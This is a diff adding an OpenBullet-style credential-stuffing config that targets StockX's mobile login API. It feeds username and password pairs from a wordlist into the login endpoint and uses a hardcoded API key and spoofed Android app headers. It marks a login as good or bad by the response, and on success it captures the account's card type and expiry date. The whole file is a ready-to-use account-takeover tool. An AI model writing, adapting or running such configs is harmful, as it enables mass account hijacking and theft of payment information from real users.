@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "StockX",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-10T03:48:41.3809926+01:00",
+  "AdditionalInfo": "",
+  "Author": "Coaster",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://gateway.stockx.com/api/v1/login" 
+  CONTENT "{\"email\":\"<USER>\",\"flagged\":false,\"hasBuyerReward\":false,\"hidePortfolioBanner\":false,\"id\":0,\"isActive\":false,\"isBuying\":false,\"isSelling\":false,\"password\":\"<PASS>\",\"securityOverride\":false,\"teamMember\":false}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "x-api-key: zWW9iZmfu02CDfd9bCWnZ29mKLgHC9AJ5kjUHvVq" 
+  HEADER "App-Platform: android" 
+  HEADER "App-Version: 4.0.1" 
+  HEADER "X-Anonymous-ID: 11cbb734-2fe7-4d94-8994-e3605330adc6" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Content-Length: 234" 
+  HEADER "Host: gateway.stockx.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.14.1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"Customer\":{\"id\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"Error\":{\"code\":400,\"title\":\"Login\",\"description\":\"Incorrect email or password.\",\"result\":null,\"messages\":{\"data\":{\"summary\":{\"error\":\"Login or password are invalid.\"}}}}}" 
+
+PARSE "<SOURCE>" JSON "cardType" -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "expirationDate" -> CAP "Expiry" 
+
